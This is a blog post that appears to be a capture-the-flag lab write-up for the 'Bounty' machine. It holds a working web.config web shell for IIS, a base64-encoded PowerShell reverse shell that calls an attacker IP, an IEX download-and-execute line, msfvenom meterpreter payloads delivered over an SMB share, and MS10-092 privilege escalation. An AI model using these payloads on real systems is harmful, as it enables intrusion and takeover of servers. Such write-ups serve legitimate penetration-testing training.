---
layout: post
title: "bounty"
date: 2025-09-13 
categories: OSCP Playlist
---
# bounty

# Summary

- fuzz aspx extension files to find file upload subdir
- can upload web.config, which can execute asp code
- executed asp web shell then execute ps encoded rev shell
- execute Sherlock.ps1 and bypass execution policy to find exploit
- host smbserver to execute meterpreter exe to get meterpreter shell
- execute exploit on meterpreter shell to get SYSTEM

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/bounty 10.10.10.93

80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Let’s visit the web page; we note the web server is IIS 7.5:

![image.png]({{ site.baseurl }}/assets/bounty/image.png)

The page source just points to the image shown. Let’s fuzz:

```bash
feroxbuster -u http://10.10.10.93 -C 404

301      GET        2l       10w      156c http://10.10.10.93/aspnet_client => http://10.10.10.93/aspnet_client/
200      GET     1624l    16517w  1403476c http://10.10.10.93/merlin.jpg
200      GET       32l       53w      630c http://10.10.10.93/
301      GET        2l       10w      156c http://10.10.10.93/uploadedfiles => http://10.10.10.93/uploadedfiles/
301      GET        2l       10w      156c http://10.10.10.93/uploadedFiles => http://10.10.10.93/uploadedFiles/
301      GET        2l       10w      156c http://10.10.10.93/UploadedFiles => http://10.10.10.93/UploadedFiles/
301      GET        2l       10w      156c http://10.10.10.93/Aspnet_client => http://10.10.10.93/Aspnet_client/
301      GET        2l       10w      156c http://10.10.10.93/aspnet_Client => http://10.10.10.93/aspnet_Client/
301      GET        2l       10w      167c http://10.10.10.93/aspnet_client/system_web => http://10.10.10.93/aspnet_client/system_web/
301      GET        2l       10w      156c http://10.10.10.93/ASPNET_CLIENT => http://10.10.10.93/ASPNET_CLIENT/
301      GET        2l       10w      167c http://10.10.10.93/Aspnet_client/system_web => http://10.10.10.93/Aspnet_client/system_web/
400      GET        6l       26w      324c http://10.10.10.93/error%1F_log
 

```

Since it is IIS, we know it probably servers .aspx files. Let’s fuzz for that:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.93/FUZZ -ic -e .aspx

transfer.aspx           [Status: 200, Size: 941, Words: 89, Lines: 22, Duration: 258ms]
UploadedFiles           [Status: 301, Size: 156, Words: 9, Lines: 2, Duration: 46ms]

```

![image.png]({{ site.baseurl }}/assets/bounty/image%201.png)

Let’s try and upload a aspx reverse shell:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f aspx -o rev.aspx 

```

We attempt to upload it but we get an error:

![image.png]({{ site.baseurl }}/assets/bounty/image%202.png)

We come across this post: https://jaykiee.medium.com/rce-by-uploading-a-web-config-7390e140a45b

After reading the blog post, it seems like we can upload a web.config, which uploads xml data, but we can still execute asp code;

We search up simple aspx web shell (https://github.com/cspshivam/webshells) and replace the asp code to the following at the bottom:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<!–-
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
-–>
```

Now let’s visit the page:

```bash
http://10.10.10.93/UploadedFiles/web.config
```

This worked. We can try another command such as dir, we can easily change the command and view the output on repeater:

Request to upload file again:

![image.png]({{ site.baseurl }}/assets/bounty/image%203.png)

Response from visiting web.config:

![image.png]({{ site.baseurl }}/assets/bounty/image%204.png)

Let’s get a reverse shell. Use Invoke-PowerShellTcpOneLine.ps1 and change this IP. Then base64 encode it:

```bash
cat shell.ps1 | iconv -t utf-16le | base64 -w 0

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoACgA=

Now our whole payload is:

Set cmd = rs.Exec("cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoACgA=")
```

Let’s setup a listener and see if this executes. 

```bash
nc -lnvp 4444
```

We now have shell:

![image.png]({{ site.baseurl }}/assets/bounty/image%205.png)

Checking our privileges:

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We can also find hidden files on Desktop with:

```bash
ls -force

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a-hs         5/30/2018  12:22 AM        282 desktop.ini                       
-arh-         9/13/2025  11:52 AM         34 user.txt
```

Using systeminfo, we find out the machine is x64. Let’s use Sherlock to find vulnerabilities to try and get SYSTEM.

We can use Sherlock to look for vulnerabilities. 

```bash
iwr http://10.10.16.7:8001/Sherlock.psq1 -OutFile Sherlock.ps1 
```

Can’t download. Also, maybe there is restricted execution policy. Let’s just do:

```bash
echo IEX(New-Object Net.WebClient).downloadString('http://10.10.16.7:8001/Sherlock.ps1') | powershell -noprofile -

Title      : Task Scheduler .XML
MSBulletin : MS10-092 
CVEID      : 2010-3338, 2010-3888                                      
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable
```

Let’s try executing a meterpreter reverse shell. First generate the payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.7 LPORT=9001 -f exe > rev.exe
```

Then start listener:

```bash
msfconsole
use exploit/multi/handler
set lhost tun0
set lport 9001
set payload windows/x64/meterpreter/reverse_tcp
```

```bash
(New-Object Net.WebClient).DownloadFile('http://10.10.16.7:8001/rev..exe','rev.exe')
```

Does not work. Let’s set up a smb server:

```bash
#on attack
sudo impacket-smbserver share -smb2support . -user test -password test

#on target:
net use Z: \\10.10.16.7\share /user:test test

\\10.10.16.7\share/rev.exe
```

We now have a meterpreter session:

![image.png]({{ site.baseurl }}/assets/bounty/image%206.png)

Let’s background the session and search for our exploit:

```bash
search MS10-092
use 0
set LPORT 9002
set LHOST tun0
set SESSION 2
run
```

![image.png]({{ site.baseurl }}/assets/bounty/image%207.png)